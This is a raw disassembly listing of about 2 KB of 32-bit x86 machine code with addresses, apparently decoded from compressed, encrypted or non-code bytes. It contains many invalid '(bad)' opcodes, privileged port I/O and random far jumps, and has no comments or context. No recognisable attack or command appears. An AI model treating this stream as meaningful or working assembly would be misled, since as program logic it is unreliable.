  41aad8:	sub    eax,0xc5a9fa24
  41aadd:	inc    esp
  41aade:	mov    eax,ds:0x272da1d2
  41aae3:	pop    ss
  41aae4:	xchg   edi,eax
  41aae5:	pop    eax
  41aae6:	std    
  41aae7:	stos   BYTE PTR es:[edi],al
  41aae8:	and    DWORD PTR [esi+0x28],ecx
  41aaeb:	lods   eax,DWORD PTR ds:[esi]
  41aaec:	push   ebp
  41aaed:	mov    esp,0x46e81bd
  41aaf2:	aad    0xe7
  41aaf4:	cmp    al,BYTE PTR [esi-0x6e1de4df]
  41aafa:	and    al,0x83
  41aafc:	sti    
  41aafd:	dec    ecx
  41aafe:	sub    al,0xbb
  41ab00:	pop    edi
  41ab01:	cdq    
  41ab02:	fdiv   QWORD PTR [edx-0x72cdfa32]
  41ab08:	mov    ebx,cs
  41ab0a:	adc    dh,BYTE PTR [edx+edx*8-0x44]
  41ab0e:	adc    ecx,DWORD PTR [ebx]
  41ab10:	popa   
  41ab11:	stos   BYTE PTR es:[edi],al
  41ab12:	or     esp,DWORD PTR [eax]
  41ab14:	(bad)  
  41ab15:	repz in eax,0x94
  41ab18:	add    DWORD PTR [edx+ebp*4-0x8afaa86],0xc6d083c3
  41ab23:	mov    dh,0x90
  41ab25:	cdq    
  41ab26:	retf   
  41ab27:	aad    0x61
  41ab29:	popf   
  41ab2a:	adc    esi,DWORD PTR [eax]
  41ab2c:	pop    eax
  41ab2d:	js     0x41aba6
  41ab2f:	xchg   edx,eax
  41ab30:	xor    al,0x21
  41ab32:	mov    eax,fs:0xde7e6d7c
  41ab38:	icebp  
  41ab39:	cmp    al,0x46
  41ab3b:	in     al,0x55
  41ab3d:	or     al,0x70
  41ab3f:	aaa    
  41ab40:	xchg   edx,eax
  41ab41:	dec    ebx
  41ab42:	sub    ah,BYTE PTR [esi]
  41ab44:	loope  0x41aacd
  41ab46:	adc    eax,0x97c47a7f
  41ab4b:	je     0x41ab9f
  41ab4d:	mov    DWORD PTR [ecx-0x3e359d32],ecx
  41ab53:	xlat   BYTE PTR ds:[ebx]
  41ab54:	or     DWORD PTR [edi+ecx*8],edx
  41ab57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab58:	inc    ebp
  41ab59:	cs mov ch,0xde
  41ab5c:	repnz dec ecx
  41ab5e:	stos   BYTE PTR es:[edi],al
  41ab5f:	repz aad 0xe7
  41ab62:	mov    eax,ds:0xf8cf52ea
  41ab67:	js     0x41aaff
  41ab69:	mov    eax,ds:0x599d8769
  41ab6e:	mov    bl,0xb9
  41ab70:	test   al,0xb6
  41ab72:	mov    ch,0xca
  41ab74:	or     DWORD PTR [esi+0x70e6a6f],ebp
  41ab7a:	xchg   edi,eax
  41ab7b:	hlt    
  41ab7c:	mov    esi,0xca7a9c89
  41ab81:	sub    esp,DWORD PTR [esi]
  41ab83:	sbb    BYTE PTR [eax-0x76],ah
  41ab86:	fucomip st,st(1)
  41ab88:	sbb    esp,DWORD PTR [edi]
  41ab8a:	jns    0x41abeb
  41ab8c:	stos   BYTE PTR es:[edi],al
  41ab8d:	jmp    0x41abb5
  41ab8f:	mov    ecx,0xfdb0da9e
  41ab94:	fucomp st(7)
  41ab96:	in     al,dx
  41ab97:	dec    eax
  41ab98:	test   BYTE PTR [ecx-0x772defdd],ch
  41ab9e:	pop    ebx
  41ab9f:	inc    esi
  41aba0:	pop    es
  41aba1:	inc    esi
  41aba2:	imul   ecx,ebp,0xffffff96
  41aba5:	cmp    al,0x2e
  41aba7:	es dec ebp
  41aba9:	inc    eax
  41abaa:	xor    esp,eax
  41abac:	rsqrtps xmm4,XMMWORD PTR [edx+0x5a250f7e]
  41abb3:	mov    ecx,0xd8544945
  41abb8:	pop    edx
  41abb9:	sbb    cl,al
  41abbb:	retf   
  41abbc:	add    dh,0xcb
  41abbf:	add    eax,0xb7e30e74
  41abc4:	xchg   ebx,eax
  41abc5:	or     eax,0x35589e85
  41abca:	push   edx
  41abcb:	mov    edi,0x9598c893
  41abd0:	mov    cl,0x8
  41abd2:	push   edx
  41abd3:	sub    al,0x92
  41abd5:	ja     0x41abaf
  41abd7:	enter  0xb923,0xb9
  41abdb:	aas    
  41abdc:	mov    DWORD PTR [edx],esp
  41abde:	retf   0x2744
  41abe1:	call   0x77a:0x76b5fcaf
  41abe8:	hlt    
  41abe9:	and    eax,0xef3f0492
  41abee:	jge    0x41ab72
  41abf0:	cld    
  41abf1:	mov    eax,gs
  41abf3:	fsub   QWORD PTR [edi]
  41abf5:	aad    0xd3
  41abf7:	inc    esi
  41abf8:	fwait
  41abf9:	push   0x24953b61
  41abfe:	test   DWORD PTR [ebx+0x21969a95],edi
  41ac04:	inc    eax
  41ac05:	add    eax,DWORD PTR [ebp-0x7a00cf17]
  41ac0b:	and    BYTE PTR [ecx],ah
  41ac0d:	push   ecx
  41ac0e:	pop    edi
  41ac0f:	jg     0x41ac22
  41ac11:	dec    eax
  41ac12:	inc    ebp
  41ac13:	mov    cl,0xef
  41ac15:	mov    ebp,DWORD PTR [ebx+0x60]
  41ac18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac19:	ins    BYTE PTR es:[edi],dx
  41ac1a:	pop    ss
  41ac1b:	add    edx,DWORD PTR [eax+esi*4-0x4ea885ee]
  41ac22:	sub    esi,DWORD PTR [edi+0x14]
  41ac25:	sbb    al,0xdb
  41ac27:	add    ebp,DWORD PTR [ebx+0x4b]
  41ac2a:	xchg   edx,eax
  41ac2b:	cmp    DWORD PTR [ebp+0x3f],eax
  41ac2e:	pusha  
  41ac2f:	test   eax,0x7e7b8da1
  41ac34:	mov    ebp,0x72764fda
  41ac39:	loope  0x41ac69
  41ac3b:	push   ecx
  41ac3c:	lahf   
  41ac3d:	retf   0x3e01
  41ac40:	xor    esp,ebx
  41ac42:	and    al,0x9b
  41ac44:	xchg   edx,eax
  41ac45:	ins    DWORD PTR es:[edi],dx
  41ac46:	loop   0x41aca2
  41ac48:	mov    edi,0x4f0fc2c5
  41ac4d:	ja     0x41ac0c
  41ac4f:	cld    
  41ac50:	xlat   BYTE PTR ds:[ebx]
  41ac51:	mov    BYTE PTR [edx-0x459396ec],bh
  41ac57:	dec    ebx
  41ac58:	addr16 push ds
  41ac5a:	jl     0x41ac22
  41ac5c:	jle    0x41ac4a
  41ac5e:	dec    esi
  41ac5f:	aas    
  41ac60:	fcomp  st(6)
  41ac62:	sahf   
  41ac63:	test   BYTE PTR [eax+0x7dc6a683],al
  41ac69:	ds (bad) 
  41ac6b:	loopne 0x41acb4
  41ac6d:	test   esi,edx
  41ac6f:	and    DWORD PTR [ebp-0x33e84185],eax
  41ac75:	cmp    al,0xc0
  41ac77:	test   eax,0x852dea22
  41ac7c:	in     al,dx
  41ac7d:	imul   ebx,DWORD PTR [ecx+0x6b],0xe697f64b
  41ac84:	xchg   esp,eax
  41ac85:	push   esi
  41ac86:	and    ch,BYTE PTR [esi]
  41ac88:	jge    0x41acac
  41ac8a:	(bad)
  41ac8d:	add    edx,edi
  41ac8f:	leave  
  41ac90:	adc    bh,BYTE PTR [ebp-0x12528d7c]
  41ac96:	and    BYTE PTR [ecx-0x4ef95b0c],dh
  41ac9c:	not    ecx
  41ac9e:	mov    eax,0x8753bc45
  41aca3:	pop    ss
  41aca4:	fnstenv [ecx-0x78b5100d]
  41acaa:	nop
  41acab:	add    eax,DWORD PTR [ecx+0x41]
  41acae:	(bad)  
  41acaf:	out    dx,eax
  41acb0:	inc    ebx
  41acb1:	mov    al,0x2f
  41acb3:	retf   
  41acb4:	ror    BYTE PTR [esi],cl
  41acb6:	jno    0x41acb3
  41acb8:	shr    ah,0xcf
  41acbb:	xor    eax,0x20a258ae
  41acc0:	out    dx,al
  41acc1:	in     eax,dx
  41acc2:	cmc    
  41acc3:	mov    al,ds:0x7ac188af
  41acc8:	mov    esp,0x43e0f1c0
  41accd:	mov    dl,0x69
  41accf:	in     al,dx
  41acd0:	test   eax,0x98c34cc2
  41acd5:	nop
  41acd6:	bound  ebp,QWORD PTR [esp+edi*1-0x13d258f3]
  41acdd:	or     al,0x79
  41acdf:	xchg   BYTE PTR [ebp+ebp*2-0x6d],ah
  41ace3:	xchg   edx,eax
  41ace4:	adc    al,0x4a
  41ace6:	test   BYTE PTR [edi+eax*4],0xc0
  41acea:	std    
  41aceb:	daa    
  41acec:	mov    ah,0xe9
  41acee:	call   FWORD PTR [edx+edx*1]
  41acf1:	aad    0x8b
  41acf3:	js     0x41ad51
  41acf5:	outs   dx,DWORD PTR ds:[esi]
  41acf6:	hlt    
  41acf7:	out    dx,al
  41acf8:	push   ss
  41acf9:	or     BYTE PTR [ecx],0x9
  41acfc:	fisubr WORD PTR [esi+0x32cb3fc8]
  41ad02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad03:	mov    ds,WORD PTR [eax]
  41ad05:	push   0x7c
  41ad07:	sub    al,0xf7
  41ad09:	add    eax,0x8995d09c
  41ad0e:	sahf   
  41ad0f:	outs   dx,BYTE PTR ds:[esi]
  41ad10:	sar    DWORD PTR [ecx-0xf57f454],0x47
  41ad17:	jg     0x41ac9f
  41ad19:	dec    eax
  41ad1a:	or     eax,0x5c3b672b
  41ad1f:	cmp    edx,DWORD PTR [edi-0x2b63865e]
  41ad25:	mov    esi,esp
  41ad27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad28:	xchg   esi,eax
  41ad29:	mov    bh,0xfc
  41ad2b:	adc    DWORD PTR [ebx],eax
  41ad2d:	inc    ebp
  41ad2e:	jmp    0x41ad6d
  41ad30:	sar    DWORD PTR [ebp-0x5491e8b4],cl
  41ad36:	loope  0x41ad1e
  41ad38:	mov    ecx,0x23eaee51
  41ad3d:	stc    
  41ad3e:	scas   eax,DWORD PTR es:[edi]
  41ad3f:	push   edx
  41ad40:	lods   eax,DWORD PTR ds:[esi]
  41ad41:	arpl   WORD PTR [ecx+esi*1],bx
  41ad44:	or     BYTE PTR [edx+0x3c],dl
  41ad47:	repz das 
  41ad49:	sub    DWORD PTR [ecx-0x40],edi
  41ad4c:	mov    ecx,0xb61520b4
  41ad51:	(bad)
  41ad55:	jecxz  0x41ada5
  41ad57:	mov    eax,ds:0x9805d6b0
  41ad5c:	adc    cl,BYTE PTR [edi+0x44]
  41ad5f:	xchg   edx,eax
  41ad60:	fwait
  41ad61:	and    al,0x81
  41ad63:	jns    0x41ad1b
  41ad65:	mov    ebx,0x6e8a11e3
  41ad6a:	jp     0x41ad39
  41ad6c:	inc    eax
  41ad6d:	clc    
  41ad6e:	jb     0x41ada1
  41ad70:	int    0x9a
  41ad72:	fwait
  41ad73:	inc    ebx
  41ad74:	mov    dl,0xc1
  41ad76:	and    BYTE PTR [eax],ch
  41ad78:	fwait
  41ad79:	dec    esp
  41ad7a:	out    0xd,al
  41ad7c:	idiv   BYTE PTR [edx]
  41ad7e:	(bad)  [ebx-0xb6f321]
  41ad84:	pop    ds
  41ad85:	xchg   esi,eax
  41ad86:	jmp    0x41ae00
  41ad88:	dec    eax
  41ad89:	add    DWORD PTR [edx],0xffffffaa
  41ad8c:	aad    0x5e
  41ad8e:	dec    esi
  41ad8f:	fadd   DWORD PTR [esi-0x44]
  41ad92:	sbb    ah,BYTE PTR [ebp+eiz*2+0x2c0dd04a]
  41ad99:	imul   BYTE PTR [ebp+0x3c5c1122]
  41ad9f:	push   0x19161790
  41ada4:	mov    ch,0x49
  41ada6:	lock sbb dl,bl
  41ada9:	out    0x56,al
  41adab:	ja     0x41ad64
  41adad:	or     esi,eax
  41adaf:	jb     0x41ad4b
  41adb1:	aam    0xe5
  41adb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41adb4:	push   esp
  41adb5:	jl     0x41add5
  41adb7:	idiv   BYTE PTR [eax+0x71]
  41adba:	mov    esi,0x5b843356
  41adbf:	imul   ebx,eax,0xb202eb1e
  41adc5:	sub    al,0xf
  41adc7:	pop    eax
  41adc8:	mov    bl,0x1e
  41adca:	xor    al,0xc
  41adcc:	call   0x88f7:0x6cc2206e
  41add3:	fld    QWORD PTR [ecx+0x3c0c4930]
  41add9:	inc    edx
  41adda:	mov    ecx,0x5446206f
  41addf:	jecxz  0x41ad82
  41ade1:	jb     0x41ae38
  41ade3:	jl     0x41adc5
  41ade5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ade6:	out    dx,eax
  41ade7:	pop    eax
  41ade8:	xchg   BYTE PTR [ecx],dl
  41adea:	cmc    
  41adeb:	dec    esi
  41adec:	push   ds
  41aded:	fbstp  TBYTE PTR ds:0x5ed9db06
  41adf3:	ins    BYTE PTR es:[edi],dx
  41adf4:	retf   0x618e
  41adf7:	loopne 0x41ad9e
  41adf9:	dec    si
  41adfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41adfc:	dec    ecx
  41adfd:	push   edi
  41adfe:	push   es
  41adff:	pop    es
  41ae00:	clc    
  41ae01:	push   0x7ad6972d
  41ae06:	adc    dh,BYTE PTR [ebx+eax*1]
  41ae09:	inc    eax
  41ae0a:	mov    bl,0x72
  41ae0c:	pop    esi
  41ae0d:	call   0xabd5a639
  41ae12:	mov    bh,0x2b
  41ae14:	into   
  41ae15:	push   ss
  41ae16:	shl    esp,0x82
  41ae19:	xor    ebp,DWORD PTR [esi+esi*1+0x74d815c5]
  41ae20:	xchg   DWORD PTR [esi],ecx
  41ae22:	inc    edi
  41ae23:	mov    dl,0xf
  41ae25:	xchg   esi,eax
  41ae26:	mov    ds:0x75f782f4,al
  41ae2b:	fs pop ss
  41ae2d:	retf   0x704c
  41ae30:	fs jge 0x41adcc
  41ae33:	or     DWORD PTR [esi],esp
  41ae35:	pop    edx
  41ae36:	mov    ds:0x33503629,al
  41ae3b:	(bad)  
  41ae3c:	pop    edx
  41ae3d:	add    al,0x4
  41ae3f:	xlat   BYTE PTR ds:[ebx]
  41ae40:	cmp    al,0x50
  41ae42:	jb     0x41aeb2
  41ae44:	push   ebp
  41ae45:	mov    dh,0xa3
  41ae47:	pop    edi
  41ae48:	jno    0x41aeb5
  41ae4a:	inc    ebp
  41ae4b:	scas   al,BYTE PTR es:[edi]
  41ae4c:	pop    edi
  41ae4d:	pop    ebp
  41ae4e:	push   ebp
  41ae4f:	mov    ?,WORD PTR [ecx+0x3f7e399]
  41ae55:	jo     0x41adf4
  41ae57:	xor    BYTE PTR [edi],al
  41ae59:	bound  esp,QWORD PTR [ebp+0x70c111b3]
  41ae5f:	sub    eax,0x25d5664a
  41ae64:	pop    edx
  41ae65:	mov    esi,0xb8284c4c
  41ae6a:	int    0xc8
  41ae6c:	add    esp,DWORD PTR [ebx+edx*2+0x7e0daa0f]
  41ae73:	pop    DWORD PTR [ebx-0x56]
  41ae76:	inc    edi
  41ae77:	add    bl,BYTE PTR [ebx-0x5f7ed248]
  41ae7d:	rol    al,0xab
  41ae80:	dec    ecx
  41ae81:	sbb    eax,0x6bbca779
  41ae86:	scas   al,BYTE PTR es:[edi]
  41ae87:	mov    edi,0x7c80deef
  41ae8c:	push   ax
  41ae8e:	pop    ebx
  41ae8f:	and    BYTE PTR [ebx-0x3a24757b],dl
  41ae95:	test   DWORD PTR [ebx+0x1f6206a3],edx
  41ae9b:	mov    ch,bl
  41ae9d:	int    0x36
  41ae9f:	imul   edi,DWORD PTR [edi],0x2051e5cf
  41aea5:	add    al,0x95
  41aea7:	(bad)  
  41aea8:	and    DWORD PTR [ebx+eax*8-0x7ec11039],edx
  41aeaf:	aad    0xfc
  41aeb1:	xor    eax,0x5cc5976d
  41aeb6:	sub    al,0xf4
  41aeb8:	jmp    0x41af17
  41aeba:	dec    edi
  41aebb:	pop    ebx
  41aebc:	(bad)  
  41aebd:	call   0x7fe04ad7
  41aec2:	not    DWORD PTR [ebx-0x27]
  41aec5:	add    edi,DWORD PTR [ecx+0x35d9cac2]
  41aecb:	fwait
  41aecc:	ret    0x4b66
  41aecf:	icebp  
  41aed0:	dec    esi
  41aed1:	sbb    ch,ah
  41aed3:	inc    ebp
  41aed4:	cld    
  41aed5:	sub    BYTE PTR [edx],ch
  41aed7:	or     dh,BYTE PTR [edx-0x29cf1bb]
  41aedd:	inc    eax
  41aede:	cs inc ebx
  41aee0:	das    
  41aee1:	mov    esp,0x88e72c2c
  41aee6:	cmp    al,0xb3
  41aee8:	int    0xab
  41aeea:	fwait
  41aeeb:	mov    ds:0xcc59f16c,eax
  41aef0:	xchg   esp,eax
  41aef1:	pop    ebp
  41aef2:	and    esp,ebx
  41aef4:	xchg   ecx,eax
  41aef5:	push   ebx
  41aef6:	nop
  41aef7:	shl    BYTE PTR [ebx],1
  41aef9:	mov    al,ds:0x15cd2ed4
  41aefe:	fs jecxz 0x41af73
  41af01:	leave  
  41af02:	daa    
  41af03:	loop   0x41af5c
  41af05:	jo     0x41af02
  41af07:	mov    al,ds:0x8720e303
  41af0c:	xor    BYTE PTR [eax-0x4148179f],0xbe
  41af13:	jnp    0x41aefe
  41af15:	pop    ebp
  41af17:	and    bh,BYTE PTR fs:[edi+0x58df6c68]
  41af1e:	mov    bh,0x95
  41af20:	outs   dx,BYTE PTR ds:[esi]
  41af21:	mov    esp,0xb041a739
  41af26:	std    
  41af27:	(bad)  
  41af28:	mov    ds:0xd444635a,eax
  41af2d:	sub    eax,0x72c85c10
  41af32:	(bad)  
  41af33:	fist   WORD PTR [ebx]
  41af35:	dec    eax
  41af36:	div    BYTE PTR [edx-0x46fd7711]
  41af3c:	arpl   WORD PTR fs:[ebx-0x3e],bp
  41af40:	mov    dh,0xd3
  41af42:	mov    ds:0xa87e4188,eax
  41af47:	cdq    
  41af48:	dec    ecx
  41af49:	fwait
  41af4a:	or     BYTE PTR [eax-0x38],bl
  41af4d:	inc    edi
  41af4e:	jmp    0x8aa11500
  41af53:	out    dx,al
  41af54:	cs and al,0x54
  41af57:	ins    BYTE PTR es:[edi],dx
  41af58:	adc    cl,ah
  41af5a:	call   0xef4be78d
  41af5f:	gs cld 
  41af61:	adc    eax,0x2c88b77b
  41af66:	xchg   ebp,eax
  41af67:	and    al,0x90
  41af69:	inc    ebp
  41af6a:	adc    al,BYTE PTR [edx]
  41af6c:	pusha  
  41af6d:	mov    ebx,es
  41af6f:	retf   
  41af70:	xchg   ebp,edi
  41af72:	jl     0x41af4d
  41af74:	rcl    ebx,cl
  41af76:	add    ebx,esi
  41af78:	jmp    0xe2914a88
  41af7d:	cdq    
  41af7e:	mov    edi,0xd66a3386
  41af83:	inc    edx
  41af84:	mov    eax,0x2bff4f39
  41af89:	das    
  41af8a:	push   edx
  41af8b:	inc    esp
  41af8c:	mov    esi,0x2ceb2dd2
  41af91:	jne    0x41afa9
  41af93:	rcl    DWORD PTR ds:0x80b12acc,1
  41af99:	add    al,0x5d
  41af9b:	pusha  
  41af9c:	push   eax
  41af9d:	ja     0x41b01b
  41af9f:	add    BYTE PTR [ecx+eiz*4-0x6d],cl
  41afa3:	cmc    
  41afa4:	(bad)  
  41afa6:	(bad)  
  41afa7:	mov    al,dl
  41afa9:	call   0x12a77410
  41afae:	or     al,BYTE PTR [ebx+0x2c]
  41afb1:	int3   
  41afb2:	jg     0x41afec
  41afb4:	das    
  41afb5:	and    al,0xd7
  41afb7:	dec    eax
  41afb8:	call   0x28a8a559
  41afbd:	mov    esp,0x43ef49b4
  41afc2:	imul   esp,DWORD PTR [esp+ebx*2-0x18],0x5e18ff75
  41afca:	aaa    
  41afcb:	ja     0x41b01a
  41afcd:	ficomp WORD PTR [edx]
  41afcf:	and    eax,0x6cddcc57
  41afd4:	inc    esp
  41afd5:	cwde   
  41afd6:	mov    bh,0x86
  41afd8:	cmp    eax,0x44da7720
  41afdd:	std    
  41afde:	retf   0x77ba
  41afe1:	lds    ebx,FWORD PTR [ebp+0x45]
  41afe4:	ss stc 
  41afe6:	fdivr  QWORD PTR [ecx]
  41afe8:	arpl   WORD PTR [edx-0x60d19420],cx
  41afee:	stos   BYTE PTR es:[edi],al
  41afef:	push   esp
  41aff0:	dec    edx
  41aff1:	and    ah,BYTE PTR ds:0x8a2e5569
  41aff7:	mov    al,0xf
  41aff9:	loop   0x41b065
  41affb:	and    ebx,DWORD PTR [edx+ebx*1+0x67]
  41afff:	add    cl,BYTE PTR [edi-0x2c14a1e3]
  41b005:	jnp    0x41afea
  41b007:	stos   BYTE PTR es:[edi],al
  41b008:	dec    esi
  41b009:	js     0x41af92
  41b00b:	jl     0x41affe
  41b00d:	xlat   BYTE PTR ds:[ebx]
  41b00e:	fadd   QWORD PTR [ebx-0x3f44a550]
  41b014:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b015:	add    BYTE PTR [ebp+edx*2+0x7bb4cb66],dl
  41b01c:	(bad)  
  41b01d:	xor    ch,dl
  41b01f:	jle    0x41b07e
  41b021:	push   ss
  41b022:	xchg   ebx,eax
  41b023:	(bad)  
  41b025:	pop    edx
  41b026:	(bad)  
  41b027:	adc    al,0x7a
  41b029:	lea    ecx,[edi]
  41b02b:	fmul   st(7),st
  41b02d:	adc    eax,0xfb217ce0
  41b032:	xchg   BYTE PTR [ebx-0x27],ah
  41b035:	jg     0x41b00e
  41b037:	jge    0x41b059
  41b039:	mov    ah,0x83
  41b03b:	xor    DWORD PTR [ecx+0x2a0f8d54],edi
  41b041:	(bad)  
  41b042:	push   DWORD PTR [ebp+esi*2-0x2c44db70]
  41b049:	imul   edx,DWORD PTR [eax+0x32bd3ba2],0xebf52ad7
  41b053:	adc    DWORD PTR [ecx+0x537d2720],0x1e
  41b05a:	int    0xbd
  41b05c:	es dec ebp
  41b05e:	fstp   DWORD PTR [ecx+0x7d]
  41b061:	mov    ch,0xed
  41b063:	xor    BYTE PTR [eax+0x0],al
  41b066:	enter  0x5c9f,0xde
  41b06a:	pusha  
  41b06b:	adc    al,0xa5
  41b06d:	smsw   WORD PTR [edi]
  41b070:	mov    esp,0x9b2827b0
  41b075:	and    al,0x6f
  41b077:	pop    edx
  41b078:	(bad)  
  41b079:	adc    ebx,DWORD PTR [ebx+edi*2]
  41b07c:	pushf  
  41b07d:	dec    ebx
  41b07e:	sub    edx,eax
  41b080:	bound  esp,QWORD PTR [ecx+eiz*8+0x27b82f0b]
  41b087:	sti    
  41b088:	fsubr  DWORD PTR [edi-0x7]
  41b08b:	out    0x2b,al
  41b08d:	add    BYTE PTR [ebx+0x68ebae8f],0x7c
  41b094:	push   ecx
  41b095:	mov    ebx,0xadb41977
  41b09a:	adc    eax,0x65d3be61
  41b09f:	pmuludq mm6,mm0
  41b0a2:	or     edx,DWORD PTR [ecx+0x39]
  41b0a5:	pop    ds
  41b0a6:	push   ebx
  41b0a7:	jge    0x41b056
  41b0a9:	ret    0x4e73
  41b0ac:	sti    
  41b0ad:	and    esp,ecx
  41b0af:	(bad)  
  41b0b0:	retf   0xad4c
  41b0b3:	add    ebp,edi
  41b0b5:	fwait
  41b0b6:	(bad)
  41b0b9:	sbb    ch,BYTE PTR [edi-0x7cd4c90c]
  41b0bf:	jmp    0x2d58:0xb796e83b
  41b0c6:	mov    dl,0x1
  41b0c8:	call   0x6443:0x5b094a87
  41b0cf:	test   WORD PTR [ecx+ebp*4-0x18],sp
  41b0d4:	sub    esi,DWORD PTR [eax]
  41b0d6:	jmp    0xf1da:0x523182fe
  41b0dd:	neg    BYTE PTR [eax+ebx*2+0x281c30a6]
  41b0e4:	hlt    
  41b0e5:	mov    al,0x6d
  41b0e7:	faddp  st(5),st
  41b0e9:	mov    gs,ebp
  41b0eb:	cs js  0x41b143
  41b0ee:	xchg   esi,eax
  41b0ef:	inc    eax
  41b0f0:	cmp    al,0xc0
  41b0f2:	adc    al,0xc1
  41b0f4:	and    ebp,esp
  41b0f6:	lods   eax,DWORD PTR ds:[esi]
  41b0f7:	jl     0x41b176
  41b0f9:	xor    DWORD PTR [eax],esp
  41b0fb:	push   ss
  41b0fc:	xchg   ebx,eax
  41b0fd:	jl     0x41b15c
  41b0ff:	std    
  41b100:	gs ins BYTE PTR es:[edi],dx
  41b102:	xor    DWORD PTR [ebx],esi
  41b104:	loop   0x41b0ac
  41b106:	xchg   BYTE PTR [ebp-0x40],bh
  41b109:	in     eax,0xc4
  41b10b:	das    
  41b10c:	loopne 0x41b17a
  41b10e:	jns    0x41b0a2
  41b110:	inc    esp
  41b111:	pushf  
  41b112:	jae    0x41b0c3
  41b114:	test   DWORD PTR [edi],ebx
  41b116:	xchg   ecx,eax
  41b117:	lock imul DWORD PTR [ecx+0x18413f84]
  41b11e:	push   es
  41b11f:	pop    ss
  41b120:	sbb    dl,BYTE PTR [ebx-0x3318b579]
  41b126:	pop    ebp
  41b127:	xchg   ecx,eax
  41b128:	sti    
  41b129:	fcmovnb st,st(3)
  41b12b:	ss mov esp,0x9e0e353d
  41b131:	iret   
  41b132:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b134:	das    
  41b135:	mov    ds:0x7b3e8749,eax
  41b13a:	(bad)  
  41b13b:	pusha  
  41b13c:	push   ss
  41b13d:	jl     0x41b18b
  41b13f:	pop    ecx
  41b140:	hlt    
  41b141:	sbb    al,0x65
  41b143:	cmp    al,0xb1
  41b145:	hlt    
  41b146:	sti    
  41b147:	mov    ebx,0x336a88c
  41b14c:	clc    
  41b14d:	sar    BYTE PTR [esi-0x56795709],1
  41b153:	pop    esp
  41b154:	xor    DWORD PTR [eax-0x18],edx
  41b157:	add    bl,dl
  41b159:	xor    ecx,DWORD PTR [eax-0x62]
  41b15c:	xor    eax,0xc6fcd129
  41b161:	fadd   DWORD PTR [ebp-0x2fafd5a9]
  41b167:	in     al,dx
  41b168:	setl   dh
  41b16b:	inc    ebp
  41b16c:	sub    dl,dl
  41b16e:	jmp    0x41b15a
  41b170:	outs   dx,BYTE PTR ds:[esi]
  41b171:	xchg   ebp,eax
  41b172:	mov    al,0x7d
  41b174:	outs   dx,BYTE PTR ds:[esi]
  41b175:	aas    
  41b176:	shl    BYTE PTR [ebp-0x63],1
  41b179:	loopne 0x41b0ff
  41b17b:	std    
  41b17c:	jbe    0x41b1c0
  41b17e:	mov    bh,0xb
  41b180:	and    DWORD PTR [edx+edi*4+0x43],ebp
  41b184:	cmp    ebx,edx
  41b186:	test   al,0xb
  41b188:	push   ebp
  41b189:	pop    edi
  41b18a:	mov    edi,0xa0b8acce
  41b18f:	mov    esp,?
  41b191:	cmp    DWORD PTR [eax-0x72],edx
  41b194:	inc    esp
  41b195:	les    esi,FWORD PTR [ecx-0x7b56d6bf]
  41b19b:	out    0xa6,al
  41b19d:	rcl    DWORD PTR [ebp-0x4b],0x1e
  41b1a1:	or     esi,esi
  41b1a3:	outs   dx,DWORD PTR ds:[esi]
  41b1a4:	pushf  
  41b1a5:	inc    eax
  41b1a6:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41b1a8:	(bad)  
  41b1a9:	cmp    ecx,DWORD PTR [eax+edi*2+0x59d07cb0]
  41b1b0:	jnp    0x41b1ca
  41b1b2:	in     eax,0x3a
  41b1b4:	pop    ebp
  41b1b5:	push   esi
  41b1b6:	out    dx,eax
  41b1b7:	add    eax,0x338703b7
  41b1bc:	or     BYTE PTR [esi],al
  41b1be:	inc    edx
  41b1bf:	ja     0x41b1af
  41b1c1:	add    ebp,edi
  41b1c3:	jb     0x41b1e8
  41b1c5:	jmp    0x41b174
  41b1c7:	sbb    eax,0x15a4bbc9
  41b1cc:	jo     0x41b232
  41b1ce:	test   BYTE PTR ds:0xdb345d16,0x99
  41b1d5:	xchg   ebp,eax
  41b1d6:	xchg   esp,eax
  41b1d7:	xor    eax,0xc1962c7d
  41b1dc:	sbb    al,0x68
  41b1de:	mov    ebp,DWORD PTR ds:0xa2d1882c
  41b1e4:	jmp    0x4b3c:0x7c4329e6
  41b1eb:	mov    DWORD PTR [edx-0x313a3942],edi
  41b1f1:	popa   
  41b1f2:	out    dx,eax
  41b1f3:	pop    edi
  41b1f4:	xchg   esi,eax
  41b1f5:	enter  0xdcd3,0x88
  41b1f9:	jecxz  0x41b1b5
  41b1fb:	sbb    BYTE PTR ss:[ecx+0x6c],0x37
  41b200:	hlt    
  41b201:	xor    ebp,DWORD PTR [ecx]
  41b203:	xchg   ecx,eax
  41b204:	mov    eax,ds:0xb21216af
  41b209:	in     al,dx
  41b20a:	dec    esp
  41b20b:	mov    edx,0xef095635
  41b210:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b211:	dec    esi
  41b212:	out    0x54,al
  41b214:	dec    esp
  41b215:	in     eax,0x88
  41b217:	mov    ebx,0x56604b5f
  41b21c:	push   edi
  41b21d:	(bad)  
  41b21e:	and    ah,BYTE PTR [eax-0x1a8d724b]
  41b224:	adc    eax,0x86531a41
  41b229:	sar    BYTE PTR [ecx+0x362aaa99],0x2a
  41b230:	std    
  41b231:	ret    0x539
  41b234:	jp     0x41b2ab
  41b236:	ins    BYTE PTR es:[edi],dx
  41b237:	cmp    DWORD PTR [ecx+0x60],esi
  41b23a:	inc    esi
  41b23b:	add    al,0x9f
  41b23d:	push   DWORD PTR [eax-0x46]
  41b240:	xchg   edi,eax
  41b241:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b242:	pop    esi
  41b243:	lods   al,BYTE PTR ds:[esi]
  41b244:	xchg   esp,eax
  41b245:	xor    edx,DWORD PTR [ecx+0x2b]
  41b248:	mov    ecx,0xa1408347
  41b24d:	imul   eax,edx,0xdf6a4824
  41b253:	fcmovnb st,st(2)
  41b255:	loop   0x41b1ec
  41b257:	dec    ebp
  41b258:	sub    al,0x24
  41b25a:	push   ds
  41b25b:	adc    al,0x80
  41b25d:	inc    edx
  41b25e:	pop    DWORD PTR [eax+ecx*8+0x1b9fdee7]
  41b265:	jmp    0x41b2db
